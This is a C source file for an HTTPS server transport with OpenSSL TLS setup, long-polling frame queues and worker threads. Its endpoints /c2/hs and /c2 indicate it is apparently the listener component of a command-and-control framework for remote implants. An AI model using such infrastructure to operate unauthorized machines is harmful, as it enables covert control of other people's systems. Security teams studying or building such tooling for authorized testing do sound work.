/*==========================================================================
 * transport_https_server.c  -  HTTPS transport backend lato server (Linux)
 *
 * Flusso:
 *   1. accept() TCP
 *   2. SSL_accept() → TLS handshake with the client
 *   3. HTTP request parsing via SSL_read (POST /c2/hs, POST /c2, GET /c2)
 *   4. Long-poll with FrameQueue, the same as transport_http_server.c
 *
 * Dependencies: OpenSSL, pthread
 * Certificate: server.crt / server.key (PEM)
 *==========================================================================*/
 
#define _POSIX_C_SOURCE 200112L
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
 
#include <openssl/ssl.h>
#include <openssl/err.h>
 
#include "transport.h"
#include "crypto_dragon.h"
 
/* -- Constants ----------------------------------------------------------- */
#define HTTPS_SRV_BACKLOG       32
#define HTTPS_LONG_POLL_MS   20000
#define HTTPS_QUEUE_SLOTS       32
#define HTTPS_MAX_HDRS        4096
 
/* =========================================================================
 * SSL global context
 * ====================================================================== */
static SSL_CTX         *g_ssl_ctx      = NULL;
static pthread_mutex_t  g_ssl_ctx_mu   = PTHREAD_MUTEX_INITIALIZER;
 
static int https_init_ctx(void)
{
    pthread_mutex_lock(&g_ssl_ctx_mu);
    if (g_ssl_ctx) { pthread_mutex_unlock(&g_ssl_ctx_mu); return 0; }
 
    SSL_library_init();
    OpenSSL_add_all_algorithms();
    SSL_load_error_strings();
 
    g_ssl_ctx = SSL_CTX_new(TLS_server_method());
    if (!g_ssl_ctx) {
        ERR_print_errors_fp(stderr);
        pthread_mutex_unlock(&g_ssl_ctx_mu);
        return -1;
    }
 
    SSL_CTX_set_min_proto_version(g_ssl_ctx, TLS1_2_VERSION);
    SSL_CTX_set_options(g_ssl_ctx,
        SSL_OP_NO_SSLv2 | SSL_OP_NO_SSLv3 | SSL_OP_NO_COMPRESSION);
 
    if (SSL_CTX_use_certificate_file(g_ssl_ctx,
                                      "server.crt", SSL_FILETYPE_PEM) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(g_ssl_ctx); g_ssl_ctx = NULL;
        pthread_mutex_unlock(&g_ssl_ctx_mu);
        return -1;
    }
    if (SSL_CTX_use_PrivateKey_file(g_ssl_ctx,
                                     "server.key", SSL_FILETYPE_PEM) != 1) {
        ERR_print_errors_fp(stderr);
        SSL_CTX_free(g_ssl_ctx); g_ssl_ctx = NULL;
        pthread_mutex_unlock(&g_ssl_ctx_mu);
        return -1;
    }
    if (SSL_CTX_check_private_key(g_ssl_ctx) != 1) {
        fprintf(stderr, "[HTTPS] cert/key mismatch\n");
        SSL_CTX_free(g_ssl_ctx); g_ssl_ctx = NULL;
        pthread_mutex_unlock(&g_ssl_ctx_mu);
        return -1;
    }
 
    printf("[HTTPS] SSL_CTX inizialized (TLS 1.2+)\n");
    pthread_mutex_unlock(&g_ssl_ctx_mu);
    return 0;
}
 
/* =========================================================================
 * FrameQueue  -  queue lock-free between dispatcher and transport layer
 * ====================================================================== */
typedef struct { uint8_t data[FRAME_SIZE]; } FrameSlot;
 
typedef struct {
    FrameSlot       slots[HTTPS_QUEUE_SLOTS];
    int             head, tail, count;
    pthread_mutex_t mu;
    pthread_cond_t  not_empty;
    pthread_cond_t  not_full;
} FrameQueue;
 
static void fq_init(FrameQueue *q) {
    memset(q, 0, sizeof *q);
    pthread_mutex_init(&q->mu, NULL);
    pthread_cond_init(&q->not_empty, NULL);
    pthread_cond_init(&q->not_full, NULL);
}
static void fq_destroy(FrameQueue *q) {
    pthread_mutex_destroy(&q->mu);
    pthread_cond_destroy(&q->not_empty);
    pthread_cond_destroy(&q->not_full);
}
static int fq_push(FrameQueue *q, const uint8_t *frame) {
    pthread_mutex_lock(&q->mu);
    if (q->count == HTTPS_QUEUE_SLOTS) {
        struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts); ts.tv_sec += 10;
        while (q->count == HTTPS_QUEUE_SLOTS)
            if (pthread_cond_timedwait(&q->not_full, &q->mu, &ts) == ETIMEDOUT) {
                pthread_mutex_unlock(&q->mu); return -1;
            }
    }
    memcpy(q->slots[q->tail].data, frame, FRAME_SIZE);
    q->tail = (q->tail + 1) % HTTPS_QUEUE_SLOTS;
    q->count++;
    pthread_cond_signal(&q->not_empty);
    pthread_mutex_unlock(&q->mu);
    return 0;
}
static int fq_pop(FrameQueue *q, uint8_t *frame, int timeout_ms) {
    pthread_mutex_lock(&q->mu);
    if (q->count == 0) {
        if (timeout_ms == 0) { pthread_mutex_unlock(&q->mu); return -1; }
        struct timespec ts;
        if (timeout_ms > 0) {
            clock_gettime(CLOCK_REALTIME, &ts);
            ts.tv_sec  += timeout_ms / 1000;
            ts.tv_nsec += (timeout_ms % 1000) * 1000000L;
            if (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
        }
        while (q->count == 0) {
            int r = (timeout_ms > 0)
                  ? pthread_cond_timedwait(&q->not_empty, &q->mu, &ts)
                  : pthread_cond_wait(&q->not_empty, &q->mu);
            if (r == ETIMEDOUT) { pthread_mutex_unlock(&q->mu); return -1; }
        }
    }
    memcpy(frame, q->slots[q->head].data, FRAME_SIZE);
    q->head = (q->head + 1) % HTTPS_QUEUE_SLOTS;
    q->count--;
    pthread_cond_signal(&q->not_full);
    pthread_mutex_unlock(&q->mu);
    return 0;
}
 
/* =========================================================================
 * transport_conn  -  structure
 * ====================================================================== */
struct transport_conn {
    FrameQueue         rx_q;        /* frame client → server */
    FrameQueue         tx_q;        /* frame server → client */
    struct sockaddr_in addr;
    volatile int       running;
};
 
/* =========================================================================
 * VConn / ListenerState
 * ====================================================================== */
typedef struct VConn {
    struct sockaddr_in  addr;
    transport_conn_t   *conn;
    struct VConn       *next;
} VConn;
 
typedef struct {
    int              listener_fd;
    VConn           *clients;
    pthread_mutex_t  mu;
    transport_conn_t *new_conn;
    pthread_cond_t   new_cond;
    pthread_t        dispatcher_tid;
    volatile int     running;
} ListenerState;
 
#define MAX_HTTPS_LISTENERS 8
static ListenerState   *g_listeners[MAX_HTTPS_LISTENERS];
static int              g_nlisteners = 0;
static pthread_mutex_t  g_listeners_mu = PTHREAD_MUTEX_INITIALIZER;
 
static ListenerState *find_listener_state(int fd) {
    pthread_mutex_lock(&g_listeners_mu);
    for (int i = 0; i < g_nlisteners; i++)
        if (g_listeners[i] && g_listeners[i]->listener_fd == fd) {
            pthread_mutex_unlock(&g_listeners_mu);
            return g_listeners[i];
        }
    pthread_mutex_unlock(&g_listeners_mu);
    return NULL;
}
 
static int ssl_read_exact(SSL *ssl, void *buf, size_t n) {
    size_t got = 0;
    while (got < n) {
        int r = SSL_read(ssl, (char*)buf + got, (int)(n - got));
        if (r <= 0) {
            int err = SSL_get_error(ssl, r);
            if (err == SSL_ERROR_WANT_READ) continue;   /* retry */
            return -1;
        }
        got += (size_t)r;
    }
    return 0;
}
static int ssl_write_exact(SSL *ssl, const void *buf, size_t n) {
    size_t sent = 0;
    while (sent < n) {
        int w = SSL_write(ssl, (const char*)buf + sent, (int)(n - sent));
        if (w <= 0) {
            int err = SSL_get_error(ssl, w);
            if (err == SSL_ERROR_WANT_WRITE) continue;  /* retry */
            return -1;
        }
        sent += (size_t)w;
    }
    return 0;
}
 
typedef struct {
    char    method[8];
    char    path[64];
    uint8_t body[FRAME_SIZE + 64];
    size_t  body_len;
} HttpsRequest;
 
static int https_read_request(SSL *ssl, HttpsRequest *req) {
    char hdr[HTTPS_MAX_HDRS]; int hlen = 0;
    while (hlen < (int)sizeof(hdr) - 1) {
        char c;
        int r = SSL_read(ssl, &c, 1);
        if (r <= 0) return -1;
        hdr[hlen++] = c;
        hdr[hlen]   = '\0';
        if (hlen >= 4 && memcmp(hdr + hlen - 4, "\r\n\r\n", 4) == 0) break;
    }
 
    char *nl = strstr(hdr, "\r\n"); if (!nl) return -1;
    char first[256]; int flen = (int)(nl - hdr);
    if (flen <= 0 || flen >= (int)sizeof(first)) return -1;
    memcpy(first, hdr, flen); first[flen] = '\0';
 
    char *sp1 = strchr(first, ' '); if (!sp1) return -1; *sp1 = '\0';
    strncpy(req->method, first, sizeof(req->method) - 1);
    req->method[sizeof(req->method) - 1] = '\0';
 
    char *sp2 = strchr(sp1 + 1, ' '); if (sp2) *sp2 = '\0';
    strncpy(req->path, sp1 + 1, sizeof(req->path) - 1);
    req->path[sizeof(req->path) - 1] = '\0';
 
    /* Content-Length (case-insensitive) */
    req->body_len = 0;
    char *cl = strcasestr(hdr, "Content-Length:"); if (!cl) return 0;
    size_t clen = (size_t)strtoul(cl + 15, NULL, 10);
    if (clen == 0) return 0;
    if (clen > sizeof(req->body)) return -1;
    if (ssl_read_exact(ssl, req->body, clen) != 0) return -1;
    req->body_len = clen;
    return 0;
}
 
static int https_respond(SSL *ssl, int code,
                          const uint8_t *body, size_t blen) {
    char hdr[256]; int hlen;
    if (body && blen > 0) {
        hlen = snprintf(hdr, sizeof hdr,
            "HTTP/1.1 %d OK\r\n"
            "Content-Type: application/octet-stream\r\n"
            "Content-Length: %zu\r\n"
            "Connection: keep-alive\r\n\r\n", code, blen);
    } else {
        hlen = snprintf(hdr, sizeof hdr,
            "HTTP/1.1 204 No Content\r\n"
            "Content-Length: 0\r\n"
            "Connection: keep-alive\r\n\r\n");
    }
    if (ssl_write_exact(ssl, hdr, (size_t)hlen) != 0) return -1;
    if (body && blen > 0)
        if (ssl_write_exact(ssl, body, blen) != 0) return -1;
    return 0;
}
 
/* =========================================================================
 * Worker thread  -  handle one connection TCP+TLS
 * ====================================================================== */
typedef struct { int fd; SSL *ssl; ListenerState *ls; } WorkerArg;
 
static void *https_worker_thread(void *arg)
{
    WorkerArg    *wa  = (WorkerArg*)arg;
    int           fd  = wa->fd;
    SSL          *ssl = wa->ssl;
    ListenerState *ls = wa->ls;
    free(wa);
 
    struct sockaddr_in caddr = {0};
    socklen_t clen = sizeof caddr;
    getpeername(fd, (struct sockaddr*)&caddr, &clen);
 
    while (1) {
        HttpsRequest req; memset(&req, 0, sizeof req);
        if (https_read_request(ssl, &req) != 0) goto cleanup;
 
        transport_conn_t *conn = NULL;
 
        pthread_mutex_lock(&ls->mu);
        for (VConn *v = ls->clients; v; v = v->next)
            if (v->addr.sin_addr.s_addr == caddr.sin_addr.s_addr) {
                conn = v->conn; break;
            }
 
        /* -- POST /c2/hs  -  handshake -- */
        if (strcmp(req.method, "POST") == 0 &&
            strcmp(req.path,   "/c2/hs") == 0 &&
            req.body_len == 32)
        {
            if (!conn) {
                conn = calloc(1, sizeof *conn);
                if (!conn) {
                    pthread_mutex_unlock(&ls->mu);
                    goto cleanup;
                }
                fq_init(&conn->rx_q);
                fq_init(&conn->tx_q);
                conn->addr    = caddr;
                conn->running = 1;
 
                VConn *v = malloc(sizeof *v);
                if (v) {
                    v->addr = caddr; v->conn = conn;
                    v->next = ls->clients; ls->clients = v;
                }
            } else {
                /* Reconnaction */
                pthread_mutex_lock(&conn->rx_q.mu);
                conn->rx_q.head = conn->rx_q.tail = conn->rx_q.count = 0;
                pthread_mutex_unlock(&conn->rx_q.mu);
                pthread_mutex_lock(&conn->tx_q.mu);
                conn->tx_q.head = conn->tx_q.tail = conn->tx_q.count = 0;
                pthread_mutex_unlock(&conn->tx_q.mu);
            }
            uint8_t padded[FRAME_SIZE] = {0};
            memcpy(padded, req.body, 32);
            fq_push(&conn->rx_q, padded);
 
            ls->new_conn = conn;
            pthread_cond_signal(&ls->new_cond);
            pthread_mutex_unlock(&ls->mu);
 
            https_respond(ssl, 204, NULL, 0);
            continue;
        }
        pthread_mutex_unlock(&ls->mu);
 
        if (!conn) {
            https_respond(ssl, 404, NULL, 0);
            goto cleanup;
        }
 
        /* -- POST /c2  -  frame client → server -- */
        if (strcmp(req.method, "POST") == 0 &&
            strcmp(req.path,   "/c2")   == 0 &&
            req.body_len == FRAME_SIZE)
        {
            fq_push(&conn->rx_q, req.body);
            https_respond(ssl, 204, NULL, 0);
        }
        /* -- GET /c2  -  long-poll server → client -- */
        else if (strcmp(req.method, "GET") == 0 &&
                 strcmp(req.path,   "/c2") == 0)
        {
            uint8_t frame[FRAME_SIZE];
            if (fq_pop(&conn->tx_q, frame, HTTPS_LONG_POLL_MS) == 0)
                https_respond(ssl, 200, frame, FRAME_SIZE);
            else
                https_respond(ssl, 204, NULL, 0);
        }
        else {
            https_respond(ssl, 404, NULL, 0);
            goto cleanup;
        }
    }
 
cleanup:
    SSL_shutdown(ssl);
    SSL_free(ssl);
    close(fd);
    return NULL;
}
 
/* =========================================================================
 * Dispatcher thread  -  accept() + SSL_accept() + run worker
 * ====================================================================== */
static void *https_dispatcher_thread(void *arg)
{
    ListenerState *ls = (ListenerState*)arg;
 
    while (ls->running) {
        struct sockaddr_in caddr; socklen_t clen = sizeof caddr;
        int cfd = accept(ls->listener_fd,
                         (struct sockaddr*)&caddr, &clen);
        if (cfd < 0) {
            if (!ls->running) break;
            perror("[HTTPS] accept");
            continue;
        }

        printf("[HTTPS] TCP accepted from %s\n", inet_ntoa(caddr.sin_addr));
 
        /* TLS handshake */
        SSL *ssl = SSL_new(g_ssl_ctx);
        if (!ssl) {
            ERR_print_errors_fp(stderr);
            close(cfd); continue;
        }
        SSL_set_fd(ssl, cfd);

        printf("[HTTPS] call SSL_accept...\n");
 
        if (SSL_accept(ssl) != 1) {
            ERR_print_errors_fp(stderr);
            SSL_free(ssl); close(cfd); continue;
        }
 
        printf("[HTTPS] TLS accepted from %s (cipher: %s)\n",
               inet_ntoa(caddr.sin_addr), SSL_get_cipher(ssl));
 
        WorkerArg *wa = malloc(sizeof *wa);
        if (!wa) { SSL_shutdown(ssl); SSL_free(ssl); close(cfd); continue; }
        wa->fd  = cfd;
        wa->ssl = ssl;
        wa->ls  = ls;
 
        pthread_t tid;
        if (pthread_create(&tid, NULL, https_worker_thread, wa) != 0) {
            perror("[HTTPS] pthread_create");
            free(wa); SSL_shutdown(ssl); SSL_free(ssl); close(cfd);
            continue;
        }
        pthread_detach(tid);
    }
    return NULL;
}
 
/* =========================================================================
 * transport_t callbacks
 * ====================================================================== */
 
static int https_srv_listen(int port)
{
    if (https_init_ctx() != 0) return -1;
 
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) { perror("[HTTPS] socket"); return -1; }
 
    int yes = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof yes);
 
    struct sockaddr_in sa = {0};
    sa.sin_family      = AF_INET;
    sa.sin_addr.s_addr = INADDR_ANY;
    sa.sin_port        = htons((uint16_t)port);
 
    if (bind(fd, (struct sockaddr*)&sa, sizeof sa) < 0) {
        perror("[HTTPS] bind"); close(fd); return -1;
    }
    if (listen(fd, HTTPS_SRV_BACKLOG) < 0) {
        perror("[HTTPS] listen"); close(fd); return -1;
    }
 
    ListenerState *ls = calloc(1, sizeof *ls);
    if (!ls) { close(fd); return -1; }
    ls->listener_fd = fd;
    ls->running     = 1;
    pthread_mutex_init(&ls->mu, NULL);
    pthread_cond_init(&ls->new_cond, NULL);
 
    if (pthread_create(&ls->dispatcher_tid, NULL,
                        https_dispatcher_thread, ls) != 0) {
        perror("[HTTPS] pthread_create dispatcher");
        free(ls); close(fd); return -1;
    }
    pthread_detach(ls->dispatcher_tid);
 
    pthread_mutex_lock(&g_listeners_mu);
    if (g_nlisteners < MAX_HTTPS_LISTENERS)
        g_listeners[g_nlisteners++] = ls;
    pthread_mutex_unlock(&g_listeners_mu);
 
    printf("[HTTPS] listening on port %d\n", port);
    return fd;
}
 
static transport_conn_t *https_srv_connect(const char *h, int p)
{
    (void)h; (void)p;
    fprintf(stderr, "[HTTPS] connect not supported from server\n");
    return NULL;
}
 
static transport_conn_t *https_srv_accept(int listener_fd,
                                           struct sockaddr_in *out_addr)
{
    ListenerState *ls = find_listener_state(listener_fd);
    if (!ls) return NULL;
 
    pthread_mutex_lock(&ls->mu);
    while (!ls->new_conn)
        pthread_cond_wait(&ls->new_cond, &ls->mu);
    transport_conn_t *conn = ls->new_conn;
    ls->new_conn = NULL;
    pthread_mutex_unlock(&ls->mu);
 
    if (out_addr) *out_addr = conn->addr;
    return conn;
}
 
static int https_srv_send(transport_conn_t *conn,
                           const uint8_t *buf, size_t len)
{
    if (!conn || !buf || len == 0) return -1;
    if (len != FRAME_SIZE) return -1;
    return (fq_push(&conn->tx_q, buf) == 0) ? (int)FRAME_SIZE : -1;
}
 
static int https_srv_recv(transport_conn_t *conn,
                           uint8_t *buf, size_t len)
{
    if (!conn || !buf || len == 0) return -1;
    uint8_t frame[FRAME_SIZE];
    if (fq_pop(&conn->rx_q, frame, -1) != 0) return -1;
    size_t copy = (len < FRAME_SIZE) ? len : FRAME_SIZE;
    memcpy(buf, frame, copy);
    return (int)copy;
}
 
static int https_srv_poll(transport_conn_t *conn, int timeout_ms)
{
    if (!conn) return -1;
    pthread_mutex_lock(&conn->rx_q.mu);
    int count = conn->rx_q.count;
    pthread_mutex_unlock(&conn->rx_q.mu);
    if (count > 0) return 1;
    if (timeout_ms == 0) return 0;
 
    pthread_mutex_lock(&conn->rx_q.mu);
    struct timespec ts; clock_gettime(CLOCK_REALTIME, &ts);
    int ms = (timeout_ms > 0) ? timeout_ms : HTTPS_LONG_POLL_MS;
    ts.tv_sec  += ms / 1000;
    ts.tv_nsec += (ms % 1000) * 1000000L;
    if (ts.tv_nsec >= 1000000000L) { ts.tv_sec++; ts.tv_nsec -= 1000000000L; }
    while (conn->rx_q.count == 0)
        if (pthread_cond_timedwait(&conn->rx_q.not_empty,
                                    &conn->rx_q.mu, &ts) == ETIMEDOUT) {
            pthread_mutex_unlock(&conn->rx_q.mu); return 0;
        }
    pthread_mutex_unlock(&conn->rx_q.mu);
    return 1;
}
 
static void https_srv_close(transport_conn_t *conn)
{
    if (!conn) return;
    conn->running = 0;
    pthread_cond_broadcast(&conn->rx_q.not_empty);
    pthread_cond_broadcast(&conn->tx_q.not_empty);
    fq_destroy(&conn->rx_q);
    fq_destroy(&conn->tx_q);
    free(conn);
}
 
static void https_srv_close_listener(int fd)
{
    ListenerState *ls = find_listener_state(fd);
    if (ls) ls->running = 0;
    shutdown(fd, SHUT_RDWR);
    close(fd);
}
 
static int https_srv_get_fd(transport_conn_t *conn)
{
    (void)conn; return -1;
}
 
transport_t TRANSPORT_HTTPS = {
    .name           = "https",
    .listen         = https_srv_listen,
    .connect        = https_srv_connect,
    .accept         = https_srv_accept,
    .send           = https_srv_send,
    .recv           = https_srv_recv,
    .poll           = https_srv_poll,
    .close          = https_srv_close,
    .close_listener = https_srv_close_listener,
    .get_fd         = https_srv_get_fd,
};